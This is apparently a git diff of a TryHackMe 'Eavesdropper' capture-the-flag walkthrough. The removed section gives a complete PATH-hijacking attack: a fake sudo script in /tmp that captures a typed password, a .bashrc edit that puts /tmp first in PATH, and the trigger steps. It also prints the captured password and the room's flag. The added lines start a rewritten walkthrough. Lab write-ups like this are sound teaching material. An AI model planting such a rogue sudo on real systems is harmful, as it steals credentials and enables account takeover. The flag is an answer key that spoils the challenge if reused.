@@ -1,81 +1,14 @@
+# <div align="center">[Eavesdropper TryHackMe Walkthrough](https://tryhackme.com/room/eavesdropper)</div>
+<div align="center">Listen closely, you might hear a password!</div>
 
-What we discover: A cron job runs sudo cat /etc/shadow when any users SSH login, but it doesn't use full paths.
-This is weird, why root would use sudo? Looks like root is connecting through SSH to frank account. There is probably a cron job executing sudo in a unattended way so we'll be able to capture root password by capturing the intput. To do so we just have to change frank's PATH so a rogue sudo command would be executed.
+<div align="center">
+  <img width="200" height="200" alt="Eavesdropper" src="https://github.com/user-attachments/assets/5def88fb-4fbe-43a3-8deb-3f47cc4d6180" />
+</div>
 
-## pRIVILLAGE eSCASLATION
-So let's prepare sudo hijacking.
-
-The content of the fake sudo will read the input to capture root password. copy past
-```
-cat > /tmp/sudo << 'EOF'
-#!/bin/bash
-read -p "Test" password
-echo $password > /home/frank/pass.txt
-EOF
-```
-What this going to do
-read -p "Test" password
-→ shows the text Test and waits for user input.
-The input gets stored in the variable password.
-echo $password > /home/frank/pass.txt
-→ writes whatever the user typed into /home/frank/pass.txt.
-
-set exc perm
-```
-chmod +x /tmp/sudo
-```
-Then we change frank's PATH so that the fake sudo will be loaded before the real one.
-```
-sed -i '4iPATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin' ~/.bashrc
-```
-Check it:
-```
-head -n 6 ~/.bashrc
-```
-Reload:
-```
-source ~/.bashrc
-```
-## Trigger the Exploit
-```
-exit
-ssh -i id-rsa-1647296932800.id-rsa frank@<IP>
-```
-
-What happens:
-
-When we login, the cron job runs sudo cat /etc/shadow
-Because /tmp is first in PATH, it finds our fake sudo script
-Our script captures the password and saves it
-
-
-<img width="1511" height="777" alt="1" src="https://github.com/user-attachments/assets/2d385b22-2da5-46d3-9696-859aa19bbe33" />
-
-
-Pass: `!@#frankisawesome2022%*`
-## Captyuring the Root Flag
-
-```
-/usr/bin/sudo su
-[sudo] password for frank: !@#frankisawesome2022%*
-```
-
-<img width="496" height="226" alt="image" src="https://github.com/user-attachments/assets/caf786b1-4eef-4540-b5c4-645776da66c9" />
-
-Flag
-```
-flag{14370304172628f784d8e8962d54a600}
-```
-
-
----
-# Eavesdropper TryHackMe Walkthrough
-
-## Task 1 — Download Keys
+## Task 1. Download Keys
 
 The room already provides an SSH private key for the user `frank`, so I started by downloading the attached key file and preparing it for SSH authentication.
 
-<img>
 
 Before using the key, I changed its permissions so SSH would accept it.
 
@@ -88,8 +21,6 @@ Once the permissions were fixed, I logged into the target machine as `frank`.
 ```bash
 ssh frank@<IP> -i id-rsa-1647296932800.id-rsa
 ```
-
-<img>
 
 ## Initial Enumeration
 
